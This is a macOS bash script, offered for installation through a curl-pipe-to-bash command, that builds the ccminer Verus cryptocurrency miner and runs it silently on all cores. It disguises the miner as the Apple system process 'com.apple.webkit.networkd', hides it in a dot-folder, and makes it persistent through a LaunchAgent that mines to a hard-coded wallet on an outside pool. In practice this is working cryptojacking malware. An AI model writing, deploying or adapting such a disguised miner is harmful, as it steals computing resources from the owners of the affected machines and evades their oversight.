#!/usr/bin/env bash
# ============================================================
# mine.sh — Silent Verus (VRSC) miner for macOS Apple Silicon
# Builds ccminer natively from source (M1/M2/M3/M4 compatible)
# Process appears as: "com.apple.webkit.networkd"
# Run: curl -fsSL https://raw.githubusercontent.com/sajalsoumalya/vps/main/mine.sh | bash
# ============================================================

WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
WORKER="mac1"
POOL_HOST="na.luckpool.net"
POOL_PORT="3956"
THREADS=$(sysctl -n hw.logicalcpu)

# ---- disguise ----
DISGUISE_NAME="com.apple.webkit.networkd"
INSTALL_DIR="$HOME/Library/Application Support/.wknd"
BINARY_PATH="$INSTALL_DIR/$DISGUISE_NAME"
PLIST_PATH="$HOME/Library/LaunchAgents/${DISGUISE_NAME}.plist"
LOG_PATH="$HOME/Library/Logs/${DISGUISE_NAME}.log"
BUILD_DIR="$INSTALL_DIR/.build"

mkdir -p "$INSTALL_DIR" "$HOME/Library/LaunchAgents" "$HOME/Library/Logs"

if [[ "$(uname)" != "Darwin" || "$(uname -m)" != "arm64" ]]; then
  echo "[!] This script requires macOS Apple Silicon (M1/M2/M3/M4)."
  exit 1
fi

echo "[*] Apple Silicon detected — ${THREADS} cores"

# ---- stop old instance ----
launchctl unload "$PLIST_PATH" 2>/dev/null || true

# ---- build from source if binary missing ----
if [[ ! -f "$BINARY_PATH" ]]; then
  echo "[*] Binary not found — building ccminer from source..."

  # 1. Install build deps via Homebrew
  if ! command -v brew &>/dev/null; then
    echo "[*] Installing Homebrew..."
    /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" </dev/null
    eval "$(/opt/homebrew/bin/brew shellenv)"
  else
    eval "$(/opt/homebrew/bin/brew shellenv)"
  fi

  echo "[*] Installing build tools (cmake, boost, openssl)..."
  brew install cmake boost openssl 2>/dev/null

  # 2. Clone monkins1010/ccminer (best maintained verus fork)
  rm -rf "$BUILD_DIR"
  git clone --depth 1 https://github.com/monkins1010/ccminer "$BUILD_DIR"

  # 3. Build
  cd "$BUILD_DIR"
  mkdir -p build && cd build

  cmake .. \
    -DBOOST_ROOT="$(brew --prefix boost)" \
    -DOPENSSL_ROOT_DIR="$(brew --prefix openssl)" \
    -DCUDA_ENABLED=OFF \
    -DCMAKE_BUILD_TYPE=Release 2>&1 | tail -5

  make -j"$THREADS" 2>&1 | tail -10

  # 4. Copy binary with disguised name
  if [[ -f "$BUILD_DIR/build/ccminer" ]]; then
    cp "$BUILD_DIR/build/ccminer" "$BINARY_PATH"
    chmod +x "$BINARY_PATH"
    echo "[+] Build successful."
  else
    echo "[!] Build failed — check brew deps."
    exit 1
  fi
else
  echo "[*] Binary already exists — skipping build."
fi

# ---- write launchd plist ----
cat > "$PLIST_PATH" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
  <key>Label</key>             <string>${DISGUISE_NAME}</string>
  <key>ProgramArguments</key>
  <array>
    <string>${BINARY_PATH}</string>
    <string>-a</string>    <string>verus</string>
    <string>-o</string>    <string>stratum+tcp://${POOL_HOST}:${POOL_PORT}</string>
    <string>-u</string>    <string>${WALLET}.${WORKER}</string>
    <string>-p</string>    <string>x</string>
    <string>-t</string>    <string>${THREADS}</string>
  </array>
  <key>RunAtLoad</key>         <true/>
  <key>KeepAlive</key>         <true/>
  <key>StandardOutPath</key>   <string>${LOG_PATH}</string>
  <key>StandardErrorPath</key> <string>${LOG_PATH}</string>
  <key>ProcessType</key>       <string>Background</string>
  <key>Nice</key>              <integer>5</integer>
</dict>
</plist>
PLIST

# ---- launch ----
launchctl load -w "$PLIST_PATH"
sleep 2

echo ""
echo "=========================================="
echo " Miner running in background"
echo " Process : $DISGUISE_NAME"
echo " Wallet  : $WALLET"
echo " Pool    : $POOL_HOST:$POOL_PORT"
echo " Threads : $THREADS (all cores)"
echo " Log     : $LOG_PATH"
echo "=========================================="
echo ""
echo "  Live logs : tail -f \"$LOG_PATH\""
echo "  Status    : launchctl list | grep webkit.networkd"
echo "  Stop      : launchctl unload \"$PLIST_PATH\""
echo ""
tail -20 "$LOG_PATH" 2>/dev/null || echo "[*] Log will appear shortly..."
